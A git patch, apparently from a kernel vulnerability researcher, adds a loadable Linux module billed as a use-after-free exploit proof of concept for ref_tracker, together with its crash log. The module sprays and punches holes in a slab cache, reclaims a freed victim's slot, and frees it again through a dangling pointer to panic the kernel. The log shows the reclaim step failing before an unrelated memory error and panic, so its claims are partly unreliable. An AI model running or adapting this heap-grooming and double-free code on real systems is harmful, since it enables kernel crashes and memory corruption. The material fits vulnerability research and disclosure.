From a211f750d90c0e0f9b205fe7eb0b32923df042d1 Mon Sep 17 00:00:00 2001
From: Shardul Bankar <shardulsb08@gmail.com>
Date: Fri, 27 Jun 2025 02:37:21 +0530
Subject: [PATCH 2/3] ref_tracker_test: Exploit PoC

---
 exploit_poc/Makefile             |   2 +-
 exploit_poc/crash_logs_v7.txt    |  66 +++++++++++++++++++
 exploit_poc/uaf_exploit_poc_v7.c | 110 +++++++++++++++++++++++++++++++
 3 files changed, 177 insertions(+), 1 deletion(-)
 create mode 100644 exploit_poc/crash_logs_v7.txt
 create mode 100644 exploit_poc/uaf_exploit_poc_v7.c

diff --git a/exploit_poc/Makefile b/exploit_poc/Makefile
index 28b77f89effe..90f5a338f63b 100644
--- a/exploit_poc/Makefile
+++ b/exploit_poc/Makefile
@@ -1,4 +1,4 @@
-obj-m += uaf_exploit_poc.o
+obj-m += uaf_exploit_poc_v7.o
 
 all:
 	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules
diff --git a/exploit_poc/crash_logs_v7.txt b/exploit_poc/crash_logs_v7.txt
new file mode 100644
index 000000000000..e3096d1f903e
--- /dev/null
+++ b/exploit_poc/crash_logs_v7.txt
@@ -0,0 +1,66 @@
+[Jun26 21:23] uaf_exploit_poc_v7: loading out-of-tree module taints kernel.
+[  +0.000359] uaf_exploit_poc_v7: module verification failed: signature and/or required key missing - tainting kernel
+[  +0.003445] ==================================================================
+[  +0.000399] BUG: KASAN: slab-out-of-bounds in prb_reserve+0x7ae/0x8c0
+[  +0.000375] Write of size 8 at addr ffff88812b6d8240 by task insmod/1692
+
+[  +0.000480] CPU: 10 PID: 1692 Comm: insmod Tainted: G           OE      6.6.94-custombuild #87
+[  +0.000489] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS rel-1.16.2-0-gea1b7a073390-prebuilt.qemu.org 04/01/2014
+[  +0.000646] Call Trace:
+
+[  +0.000240] The buggy address belongs to the object at ffff88812b6d8230
+               which belongs to the cache audit_buffer of size 24
+[  +0.000702] The buggy address is located 16 bytes inside of
+               allocated 24-byte region [ffff88812b6d8230, ffff88812b6d8248)
+
+[  +0.000791] The buggy address belongs to the physical page:
+[  +0.000317] page:00000000e9fa10e4 refcount:1 mapcount:0 mapping:0000000000000000 index:0xffff88812b6d8d48 pfn:0x12b6d8
+[  +0.000606] flags: 0x17ffffc0000800(slab|node=0|zone=2|lastcpupid=0x1fffff)
+[  +0.000396] page_type: 0xffffffff()
+[  +0.000205] raw: 0017ffffc0000800 ffff888100b22000 dead000000000122 0000000000000000
+[  +0.000442] raw: ffff88812b6d8d48 000000008066005c 00000001ffffffff 0000000000000000
+[  +0.000438] page dumped because: kasan: bad access detected
+
+[  +0.000414] Memory state around the buggy address:
+[  +0.000275]  ffff88812b6d8100: 00 f3 f3 f3 fc fc fc fc fc fc fc fc fc fc fc fc
+[  +0.000386]  ffff88812b6d8180: fc fc fb fb fb fc fc f1 f1 f1 f1 04 f2 04 f2 00
+[  +0.000407] >ffff88812b6d8200: 00 00 f2 f2 f2 f2 f2 fc fc fc fc f2 f2 f2 f2 00
+[  +0.000402]                                            ^
+[  +0.000300]  ffff88812b6d8280: 00 00 f2 f2 f2 f2 f2 00 f3 f3 f3 fc fc fc fc fa
+[  +0.000406]  ffff88812b6d8300: fb fb fc fc fc fc fc fc fc fa fb f1 f1 f1 f1 00
+[  +0.000324] ==================================================================
+[  +0.000306] Disabling lock debugging due to kernel taint
+[  -0.009747] UAF_POC: --- Phase 2.7: Forcing Kernel Crash via UAF ---
+[  +0.010270] UAF_POC: Step 1: Allocating 10000 objects.
+[  +0.009589] UAF_POC: Step 2: Creating holes in the slab cache.
+[  +0.001487] UAF_POC: Step 3: Freeing live victim object at index 25 (ffff88810942a5c0).
+[  +0.000327] UAF_POC: Step 4: Attacker allocating object to reclaim victim's memory.
+[  +0.000311] UAF_POC: Step 4: Checking if attacker hit any freed memory.
+[  +0.000334] UAF_POC: FAIL - Memory reuse failed! Attacker got ffff88810aefc3c0.
+[  +0.003449] ref_tracker: exploit_test@00000000cea8bbea has 4999/4999 users at
+
+[  +0.003024] ------------[ cut here ]------------
+[  +0.000285] WARNING: CPU: 10 PID: 1692 at lib/ref_tracker.c:179 ref_tracker_dir_exit+0x467/0x780
+[  +0.000401] Modules linked in: uaf_exploit_poc_v7(OE+) 9p rfkill isofs binfmt_misc vfat fat ppdev snd_pcm parport_pc parport bochs snd_timer drm_vram_helper virtio_net drm_ttm_helper snd ttm net_failover failover joydev soundcore i2c_piix4 pcspkr loop nfnetlink vsock_loopback vmw_vsock_virtio_transport_common vmw_vsock_vmci_transport vsock vmw_vmci zram floppy 9pnet_virtio 9pnet serio_raw ata_generic pata_acpi fuse qemu_fw_cfg
+[  +0.001591] CPU: 10 PID: 1692 Comm: insmod Tainted: G    B      OE      6.6.94-custombuild #87
+[  +0.000392] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS rel-1.16.2-0-gea1b7a073390-prebuilt.qemu.org 04/01/2014
+[  +0.000490] RIP: 0010:ref_tracker_dir_exit+0x467/0x780
+[  +0.000214] Code: 4c 02 00 00 49 8b 04 24 4d 89 e7 4d 39 e5 0f 85 10 ff ff ff 48 8b 1c 24 e8 56 26 8a fe 48 8b 74 24 18 48 89 df e8 89 12 ba 01 <0f> 0b e8 42 26 8a fe 48 8d 6b 44 be 04 00 00 00 48 89 ef e8 41 9b
+[  +0.000740] RSP: 0018:ffff88812b6d83f0 EFLAGS: 00010286
+[  +0.000247] RAX: 0000000000000000 RBX: ffff88812b6d8518 RCX: 1ffffffff336469f
+[  +0.000309] RDX: ffff8881457c0000 RSI: 0000000000000008 RDI: ffffffff971dd954
+[  +0.000316] RBP: dffffc0000000000 R08: ffffffff93f966f3 R09: 0000000000000000
+[  +0.000310] R10: fffffbfff3363885 R11: 0000000000000000 R12: ffff88812b6d8568
+[  +0.000287] R13: ffff88812b6d8568 R14: ffff88812b6d8568 R15: ffff88812b6d8568
+[  +0.000293] FS:  00007ff2c0e11740(0000) GS:ffff88848a100000(0000) knlGS:0000000000000000
+[  +0.000381] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
+[  +0.000235] CR2: 00005599c31c35f0 CR3: 00000001479e6000 CR4: 00000000000006e0
+[  +0.000294] Call Trace:
+[  +0.000108] irq event stamp: 20744
+[  +0.000168] hardirqs last  enabled at (20743): [<ffffffff971dd954>] _raw_spin_unlock_irqrestore+0x44/0x60
+[  +0.000414] hardirqs last disabled at (20744): [<ffffffff93ccba48>] vprintk_store+0x678/0xa60
+[  +0.000350] softirqs last  enabled at (20270): [<ffffffff93ac5541>] handle_softirqs+0x531/0x7e0
+[  +0.000422] softirqs last disabled at (20265): [<ffffffff93ac5959>] __irq_exit_rcu+0x159/0x1b0
+[  +0.000347] ---[ end trace 0000000000000000 ]---
+[  +0.000209] Kernel panic - not syncing: corrupted stack end detected inside scheduler
+
diff --git a/exploit_poc/uaf_exploit_poc_v7.c b/exploit_poc/uaf_exploit_poc_v7.c
new file mode 100644
index 000000000000..4cba9da1f54a
--- /dev/null
+++ b/exploit_poc/uaf_exploit_poc_v7.c
@@ -0,0 +1,110 @@
+// SPDX-License-Identifier: GPL-2.0
+/*
+ * ref_tracker Use-After-Free Exploit Primitive PoC (v7 - Crash Trigger)
+ *
+ * This version corrects the logic of previous PoCs to definitively
+ * trigger a hard kernel crash by causing a kfree() on live memory.
+ * This demonstrates the full impact of the vulnerability primitive.
+ */
+#include <linux/init.h>
+#include <linux/module.h>
+#include <linux/slab.h>
+#include <linux/ref_tracker.h>
+
+#define ALLOC_COUNT 10000
+// CRITICAL CHANGE: Victim MUST be an odd index, so it's not freed in the hole-punching loop.
+#define VICTIM_INDEX 25
+
+static int __init uaf_exploit_poc_init(void)
+{
+	struct ref_tracker_dir dir;
+	struct ref_tracker *spray_objects[ALLOC_COUNT] = { NULL };
+	struct ref_tracker *alloc_objs[ALLOC_COUNT] = { NULL };
+	struct ref_tracker *attacker_obj = NULL;
+	void *victim_addr = NULL;
+	int i;
+
+	pr_info("UAF_POC: --- Phase 2.7: Forcing Kernel Crash via UAF ---\n");
+	// This check is to ensure our logic is sound. Victim must be odd.
+	BUG_ON(VICTIM_INDEX >= ALLOC_COUNT || VICTIM_INDEX % 2 == 0);
+
+	ref_tracker_dir_init(&dir, ALLOC_COUNT + 10, "exploit_test");
+
+	// 1. Allocate objects to control the slab.
+	pr_info("UAF_POC: Step 1: Allocating %d objects.\n", ALLOC_COUNT);
+	for (i = 0; i < ALLOC_COUNT; i++) {
+		if (ref_tracker_alloc(&dir, &spray_objects[i], GFP_KERNEL) != 0) {
+			pr_err("UAF_POC: Allocation failed at index %d, aborting.\n", i);
+			goto fail_cleanup;
+		}
+                alloc_objs[i] = spray_objects[i];
+	}
+
+	// 2. Create "holes" by freeing even-indexed objects.
+	pr_info("UAF_POC: Step 2: Creating holes in the slab cache.\n");
+	for (i = 0; i < ALLOC_COUNT; i += 2) {
+		ref_tracker_free(&dir, &spray_objects[i]);
+	}
+
+	// 3. Free our LIVE victim (an odd-indexed object). This is its FIRST free.
+	// `spray_objects[VICTIM_INDEX]` is now a dangling pointer.
+	victim_addr = spray_objects[VICTIM_INDEX];
+	pr_info("UAF_POC: Step 3: Freeing live victim object at index %d (%px).\n", VICTIM_INDEX, victim_addr);
+	ref_tracker_free(&dir, &spray_objects[VICTIM_INDEX]);
+
+	// 4. Attacker reclaims the victim's memory slot.
+	pr_info("UAF_POC: Step 4: Attacker allocating object to reclaim victim's memory.\n");
+	if (ref_tracker_alloc(&dir, &attacker_obj, GFP_KERNEL) != 0) {
+		pr_err("UAF_POC: Attacker allocation failed!\n");
+		goto fail_cleanup;
+	}
+
+	pr_info("UAF_POC: Step 4: Checking if attacker hit any freed memory.\n");
+	for (i = 0; i < ALLOC_COUNT; i++) {
+		if (alloc_objs[i] == attacker_obj) {
+			pr_err("UAF_POC: Hit! at index %d, proceeding.\n", i);
+                        victim_addr = alloc_objs[i];
+                        break;
+		}
+	}
+
+	// 5. Verify reclamation and set up the final trigger.
+	if (attacker_obj != victim_addr) {
+		pr_err("UAF_POC: FAIL - Memory reuse failed! Attacker got %px.\n", attacker_obj);
+		ref_tracker_free(&dir, &attacker_obj);
+		goto fail_cleanup;
+	}
+
+	pr_info("UAF_POC: SUCCESS! Attacker object at %px has reclaimed the victim's memory.\n", attacker_obj);
+	pr_info("UAF_POC: The `dead` field was zeroed by kzalloc, arming the exploit.\n");
+
+	// 6. TRIGGER THE CRASH.
+	// Call free using the dangling pointer. This operates on the live `attacker_obj`.
+	// The `if (tracker->dead)` safeguard will be bypassed.
+	// The kernel will call kfree() on a live object.
+	pr_warn("UAF_POC: Step 6: Triggering UAF. This call will crash the kernel.\n");
+	ref_tracker_free(&dir, &spray_objects[VICTIM_INDEX]);
+
+	// This line should be unreachable.
+	pr_err("UAF_POC: KERNEL SURVIVED - This indicates the exploit failed.\n");
+	ref_tracker_free(&dir, &attacker_obj);
+	ref_tracker_dir_exit(&dir);
+	return -EFAULT;
+
+fail_cleanup:
+	// Basic cleanup on failure
+	ref_tracker_dir_exit(&dir);
+	return -EAGAIN;
+}
+
+static void __exit uaf_exploit_poc_exit(void)
+{
+	pr_info("UAF_POC: Module unloaded.\n");
+}
+
+module_init(uaf_exploit_poc_init);
+module_exit(uaf_exploit_poc_exit);
+
+MODULE_LICENSE("GPL");
+MODULE_AUTHOR("Vulnerability Researcher");
+MODULE_DESCRIPTION("PoC for ref_tracker UAF (v7 - Crash Trigger)");
-- 
2.34.1

